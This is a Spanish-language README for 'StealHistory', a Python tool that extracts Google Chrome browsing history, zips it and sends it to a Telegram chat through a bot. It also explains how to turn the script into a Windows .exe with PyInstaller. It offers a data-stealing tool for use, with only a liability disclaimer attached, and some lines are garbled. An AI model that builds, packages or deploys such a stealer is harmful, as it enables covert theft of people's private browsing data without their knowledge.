# StealHistory
Este programa de Python permite extraer el historial de navegación del 
navegador Google Chrome y enviarlo a través de Telegram. El programa comprime el 
historial en un archivo ZIP y lo envía a un chat de Telegram utilizando la API de Telegram.

## Requisitos
Asegúrate de tener los siguientes requisitos instalados:

- Ejecuta DataHunter passar a .exe el script

   Python 3.x
 
  ```bash
      import requests
      import psutil
  
## Configuración
Configura tus credenciales de Telegram en un archivo llamado `config.py`
en el mismo directorio que este programa. Debe contener una función `get_telegram_config`
que devuelva un diccionario con el token del bot de Telegram y el ID del chat 
donde deseas recibir los archivos. Aquí hay un ejemplo de cómo podría verse:


         def get_telegram_config():   
             return {
                 'TOKEN': '  ',
                 'CHAT_ID': '  '
             }


## Ejecutar un script en Python:
Para ejecutar un script Python main.py debes abrir una terminal 
o línea de comandos 
`python main.py`



## Ejecuta el Archivo conversor_a_exe.bat
Para convertir tu script Python en un archivo ejecutable, simplemente ejecuta 
el archivo `conversor_a_exe.bat`. Puedes hacerlo de la siguiente manera

1-Doble clic en el archivo conversor_a_exe.bat: Al hacer doble clic en este archivo, se abrirá una ventana de terminal o línea de comandos.

2-La terminal te solicitará la ruta del archivo Python: En la ventana de la terminal,
verás un mensaje que indica "Introduce la ruta absoluta del archivo .py o .pyw:". 
Ahora debes proporcionar la ruta absoluta del archivo Python que deseas convertir
en un archivo ejecutable. Asegúrate de escribir la ruta correctamente.

3-Ejecuta el proceso de conversión: Una vez que hayas ingresado la ruta 
del archivo Python y presionado Enter, el script `.bat` utilizará PyInstaller
para convertir el archivo Python en un archivo ejecutable .exe.

4-El archivo ejecutable se crea en la misma ubicación: Después de completar el
proceso de conversión, el archivo ejecutable resultante se creará en la misma 
ubicación donde se encuentra el archivo `conversor_a_exe.bat`.

5-Confirmación de éxito: El script `.bat` mostrará un mensaje que indica que el archivo 
ejecutable se ha creado exitosamente. Ahora puedes encontrar
y ejecutar el archivo .exe recién creado según sea necesario.


# Responsabilidad y Uso Ético
El autor de este software no asume ninguna responsabilidad por el uso indebido del 
software o cualquier daño que pueda resultar del uso de este software. El usuario es el único 
responsable de su uso y debe utilizarlo de manera ética y legal.

El autor de este software no será responsable de ninguna pérdida, daño o consecuencia que resulte del uso de este software.
Por favor, utilice este software con responsabilidad y de acuerdo con las leyes y regulaciones aplicables en su jurisdicción.


